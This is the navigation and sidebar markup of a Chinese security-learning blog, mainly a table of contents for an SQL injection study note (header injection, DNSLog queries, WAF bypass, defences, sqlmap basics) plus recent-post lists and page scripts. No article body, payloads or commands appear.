class="toc-text">HTTP 请求头结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E5%A4%B4%E5%AD%97%E6%AE%B5"><span class="toc-number">1.12.3.</span> <span class="toc-text">常见注入头字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18%EF%BC%9AUser-Agent-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.12.4.</span> <span class="toc-text">Less-18：User-Agent 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88-4"><span class="toc-number">1.12.4.1.</span> <span class="toc-text">判断闭合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88and-%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%EF%BC%89"><span class="toc-number">1.12.4.2.</span> <span class="toc-text">报错注入（and 闭合方式）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E5%86%99%E6%B3%95%EF%BC%88or-%E6%B3%A8%E9%87%8A%EF%BC%89"><span class="toc-number">1.12.4.3.</span> <span class="toc-text">另一种写法（or + 注释）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%B1%E5%BA%93-3"><span class="toc-number">1.12.4.4.</span> <span class="toc-text">脱库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19%EF%BC%9AReferer-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.12.5.</span> <span class="toc-text">Less-19：Referer 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88-5"><span class="toc-number">1.12.5.1.</span> <span class="toc-text">判断闭合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.12.5.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%B1%E5%BA%93-4"><span class="toc-number">1.12.5.3.</span> <span class="toc-text">脱库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81-HTTP-%E5%A4%B4%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.12.6.</span> <span class="toc-text">常见 HTTP 头注入点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.13.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.14.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.14.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.15.</span> <span class="toc-text">读写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.15.1.</span> <span class="toc-text">前置条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6%EF%BC%9Aload-file"><span class="toc-number">1.15.2.</span> <span class="toc-text">读文件：load_file()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%EF%BC%9Ainto-outfile"><span class="toc-number">1.15.3.</span> <span class="toc-text">写文件：into outfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#outfile-%E4%B8%8E-dumpfile-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.15.4.</span> <span class="toc-text">outfile 与 dumpfile 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E8%B7%AF%E5%BE%84"><span class="toc-number">1.15.5.</span> <span class="toc-text">写入路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSLog-%E5%A4%96%E5%B8%A6%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.16.</span> <span class="toc-text">DNSLog 外带查询</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">1.16.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.16.2.</span> <span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF-%E7%BB%95%E8%BF%87"><span class="toc-number">1.17.</span> <span class="toc-text">WAF 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.17.1.</span> <span class="toc-text">常见绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5"><span class="toc-number">1.17.2.</span> <span class="toc-text">等价函数速查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87%EF%BC%88Less-23-%E7%A4%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.17.3.</span> <span class="toc-text">特殊注释绕过（Less-23 示例）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%EF%BC%88Less-26-%E7%A4%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.17.4.</span> <span class="toc-text">空格绕过（Less-26 示例）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E7%8B%97%E5%AE%9E%E6%88%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.17.5.</span> <span class="toc-text">绕狗实战思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">1.18.</span> <span class="toc-text">SQL 注入防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%98%B2%E5%BE%A1"><span class="toc-number">1.18.1.</span> <span class="toc-text">代码层防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84%E5%B1%82%E9%98%B2%E5%BE%A1"><span class="toc-number">1.18.2.</span> <span class="toc-text">架构层防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%89%B9%E9%98%B2"><span class="toc-number">1.18.3.</span> <span class="toc-text">宽字节注入特防</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-%E5%9F%BA%E7%A1%80"><span class="toc-number">1.19.</span> <span class="toc-text">sqlmap 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A3%80%E6%B5%8B"><span class="toc-number">1.19.1.</span> <span class="toc-text">基本检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.19.2.</span> <span class="toc-text">获取数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8"><span class="toc-number">1.19.3.</span> <span class="toc-text">获取表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5"><span class="toc-number">1.19.4.</span> <span class="toc-text">获取字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.19.5.</span> <span class="toc-text">获取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">1.19.6.</span> <span class="toc-text">常用参数</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/15/sqlmap/" title="sqlmap使用">sqlmap使用</a><time datetime="2026-05-14T16:00:00.000Z" title="发表于 2026-05-15 00:00:00">2026-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="SQL 注入学习笔记"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/sql.png" onerror="this.onerror=null;this.src='/cover/404.png'" alt="SQL 注入学习笔记"/></a><div class="content"><a class="title" href="/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="SQL 注入学习笔记">SQL 注入学习笔记</a><time datetime="2026-05-14T01:09:22.000Z" title="发表于 2026-05-14 09:09:22">2026-05-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/14/sqli-lib/" title="sqli-labs 靶场实战记录">sqli-labs 靶场实战记录</a><time datetime="2026-05-13T16:00:00.000Z" title="发表于 2026-05-14 00:00:00">2026-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/05/next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/" title="next主题美化"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/5.png" onerror="this.onerror=null;this.src='/cover/404.png'" alt="next主题美化"/></a><div class="content"><a class="title" href="/2025/11/05/next%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/" title="next主题美化">next主题美化</a><time datetime="2025-11-05T13:09:00.000Z" title="发表于 2025-11-05 21:09:00">2025-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/08/%E5%9F%BA%E4%BA%8EWindows%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/" title="入侵检测系统配置"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/cover/default.png" onerror="this.onerror=null;this.src='/cover/404.png'" alt="入侵检测系统配置"/></a><div class="content"><a class="title" href="/2025/06/08/%E5%9F%BA%E4%BA%8EWindows%E6%8E%A7%E5%88%B6%E5%8F%B0%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/" title="入侵检测系统配置">入侵检测系统配置</a><time datetime="2025-06-08T15:30:10.000Z" title="发表于 2025-06-08 23:30:10">2025-06-08</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025 - 2026 By cHr1s</div><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/hashiqi.svg" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">7</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">SQL注入<sup>2</sup></a><a href="/tags/basics/" style="font-size: 0.88rem;">basics<sup>3</sup></a><a href="/tags/ctf/" style="font-size: 0.88rem;">ctf<sup>4</sup></a><a href="/tags/hexo%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0/" style="font-size: 0.88rem;">hexo装修日记<sup>2</sup></a><a href="/tags/sqli-labs/" style="font-size: 0.88rem;">sqli-labs<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">sql注入<sup>1</sup></a><a href="/tags/study/" style="font-size: 0.88rem;">study<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">web安全<sup>4</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>1</sup></a><a href="/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 0.88rem;">刷题记录<sup>3</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>1</sup></a><a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.88rem;">杂项<sup>1</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">测试<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/playlist?id=360062344&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
   if (typeof pangu === 'object') pangu.autoSpacingPage()
   else {
     getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
